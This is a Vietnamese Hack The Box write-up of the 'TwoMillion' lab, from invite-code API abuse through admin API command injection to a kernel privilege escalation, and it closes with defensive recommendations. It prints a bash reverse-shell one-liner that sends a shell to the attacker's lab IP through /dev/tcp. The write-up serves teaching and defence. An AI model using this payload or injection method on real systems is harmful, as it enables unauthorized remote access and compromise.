---
title: "TwoMillion"
description: "Khai thác invite API, leo quyền admin qua API, tấn công command injection trên VPN generator và privilege escalation bằng kernel exploit."
platform: "Hack The Box"
category: "Linux"
difficulty: "Easy"
publishedAt: 2026-07-30
tags: ["api", "invite-code", "command-injection", "reverse-shell", "linux", "privesc"]
language: "vi"
translationKey: "hack-the-box/twomillion"
draft: false
featured: true
cover: "/images/twomillion/two-million-02.png"
---

> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.

## Quét dịch vụ

Kiểm tra các port TCP đang mở trên máy mục tiêu:

![Kết quả quét Nmap](/images/twomillion/two-million-01.png)

Máy mục tiêu có dịch vụ web đang chạy, vì vậy bắt đầu bằng việc truy cập ứng dụng và quan sát các file JavaScript được load:

![Kiểm tra ứng dụng web và file JavaScript](/images/twomillion/two-million-02.png)

## Phân tích invite code API

Truy cập file JavaScript của ứng dụng:

![Truy cập file JavaScript](/images/twomillion/two-million-03.png)

File JavaScript bị obfuscate, nên copy phần code này đưa qua công cụ deobfuscate để đọc logic bên trong:

![Nội dung JavaScript sau khi deobfuscate](/images/twomillion/two-million-04.png)

Trong hàm `makeInviteCode`, ứng dụng gọi đến endpoint:

```text
/api/v1/invite/how/to/generate
```

![Hàm makeInviteCode gọi endpoint gợi ý cách tạo invite](/images/twomillion/two-million-05.png)

Khi gọi endpoint này, API trả về một chuỗi đã mã hóa. Sau khi decode, nội dung nhận được là:

```text
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

![API trả về hướng dẫn tạo invite code](/images/twomillion/two-million-06.png)

Chuỗi trả về là Base64. Tiếp tục gọi `POST /api/v1/invite/generate`, decode kết quả và thu được invite code:

```text
SZ1JG-326ND-L51VI-8OK7K
```

Lưu ý: invite code chỉ sử dụng được một lần. Nếu cần code mới, chỉ cần gọi lại endpoint generate.

![Decode invite code từ Base64](/images/twomillion/two-million-07.png)

## Đăng ký và enumerate API

Dùng invite code để tạo tài khoản, sau đó truy cập trang Access và bật Burp Suite để quan sát request:

![Đăng ký tài khoản bằng invite code](/images/twomillion/two-million-08.png)

![Quan sát request trong Burp Suite](/images/twomillion/two-million-09.png)

Thử enumerate API:

![Enumerate các API endpoint](/images/twomillion/two-million-10.png)

Lần đầu request bị trả về `401 Unauthorized` vì chưa login. Đăng nhập bằng tài khoản vừa tạo:

![Đăng nhập tài khoản mới tạo](/images/twomillion/two-million-11.png)

![API trả về thông tin sau khi đã login](/images/twomillion/two-million-12.png)

Lúc này có thể thấy có các endpoint nằm dưới `/api/v1/admin`. Đây là bề mặt tấn công quan trọng vì chúng liên quan đến quyền admin và chức năng tạo VPN.

## Khai thác API admin

Thử lần lượt các endpoint admin và payload injection. Endpoint đáng chú ý là:

```text
/api/v1/admin/vpn/generate
```

Endpoint này có thể bị command injection thông qua dữ liệu đầu vào:

![Phát hiện command injection trên API tạo VPN](/images/twomillion/two-million-13.png)

Dùng reverse shell để máy target chủ động kết nối về máy local:

```bash
sh -i >& /dev/tcp/10.10.14.69/9001 0>&1
```

![Gửi payload reverse shell qua API](/images/twomillion/two-million-14.png)

Sau khi có shell, đọc các thông tin cấu hình và thu được thông tin đăng nhập:

![Thu được thông tin đăng nhập trên máy target](/images/twomillion/two-million-15.png)

Thử kết nối SSH đến máy target:

![Kết nối SSH bằng credential thu được](/images/twomillion/two-million-16.png)

![Đọc user flag](/images/twomillion/two-million-17.png)

Như vậy ta đã lấy được user flag trong thư mục của user `admin`.

## Privilege escalation

Dựa vào gợi ý của Hack The Box và thông tin trên máy, tiếp tục tìm vector leo thang đặc quyền:

![Gợi ý về hướng privilege escalation](/images/twomillion/two-million-18.png)

![Thông tin kernel và môi trường hệ thống](/images/twomillion/two-million-19.png)

Từ các thông tin thu được, đây là một vulnerability có thể dùng để leo thang đặc quyền trên Linux kernel. Sử dụng exploit open source trên GitHub:

![Tải exploit open source từ GitHub](/images/twomillion/two-million-20.png)

Tạo HTTP server trên máy local để máy target tải file exploit:

![Mở HTTP server trên máy local](/images/twomillion/two-million-21.png)

![Máy target tải file exploit](/images/twomillion/two-million-22.png)

Mở hai tab terminal: một tab chạy script exploit, tab còn lại dùng để truy cập shell quyền root:

![Chạy exploit privilege escalation](/images/twomillion/two-million-23.png)

![Lấy được shell root](/images/twomillion/two-million-24.png)

## Tổng kết

### Exploit API

Phần khai thác API trong TwoMillion có hai điểm quan trọng:

- Ứng dụng để lộ logic tạo invite code ở client-side JavaScript. Dùng deobfuscate có thể đọc được endpoint nội bộ `/api/v1/invite/how/to/generate`, từ đó lần ra endpoint `POST /api/v1/invite/generate` để tạo invite code hợp lệ.
- Các endpoint admin không được bảo vệ chặt chẽ theo đúng mô hình phân quyền. Sau khi có account và enumerate API, attacker có thể tiếp cận các endpoint dưới `/api/v1/admin`, đặc biệt là chức năng generate VPN.
- Endpoint `/api/v1/admin/vpn/generate` xử lý input không an toàn và đưa dữ liệu người dùng vào command hệ thống. Đây là command injection, cho phép chèn payload reverse shell và lấy foothold trên máy target.

**Khuyến nghị phòng thủ:**

- Không đặt logic bảo mật quan trọng ở client-side; JavaScript trên trình duyệt luôn có thể bị đọc, deobfuscate và debug.
- Tất cả endpoint API cần kiểm tra authentication và authorization ở server-side, đặc biệt với endpoint admin.
- Không nối chuỗi input người dùng vào shell command. Nếu bắt buộc gọi command hệ thống, cần dùng argument array, whitelist giá trị hợp lệ và validate chặt đầu vào.
- Ghi log và cảnh báo các request bất thường đến endpoint admin, nhất là các payload có ký tự shell như `;`, `&`, `|`, `$()`, backtick hoặc redirect.

### Privilege escalation

Sau khi có SSH vào user `admin`, mục tiêu tiếp theo là kiểm tra thông tin hệ điều hành, kernel và các gói đang cài. Gợi ý từ HTB cùng với thông tin trên máy cho thấy kernel đang tồn tại một lỗi có exploit công khai. Khi exploit thành công, attacker có thể chuyển từ user thường lên root và đọc `root.txt`.

Đây là mẫu privilege escalation phổ biến trong CTF/lab: foothold ban đầu đến từ ứng dụng web, sau đó leo quyền dựa trên cấu hình hệ điều hành hoặc kernel chưa được cập nhật.

**Khuyến nghị phòng thủ:**

- Cập nhật kernel và security patch định kỳ, ưu tiên các CVE có exploit công khai.
- Áp dụng nguyên tắc least privilege cho user chạy ứng dụng web và user hệ thống.
- Bật các cơ chế hardening như AppArmor/SELinux, restrict unprivileged user namespaces nếu không cần thiết.
- Giám sát hành vi bất thường sau khai thác, ví dụ tải exploit về `/tmp`, chạy binary lạ, hoặc mở kết nối ngược về IP bên ngoài.
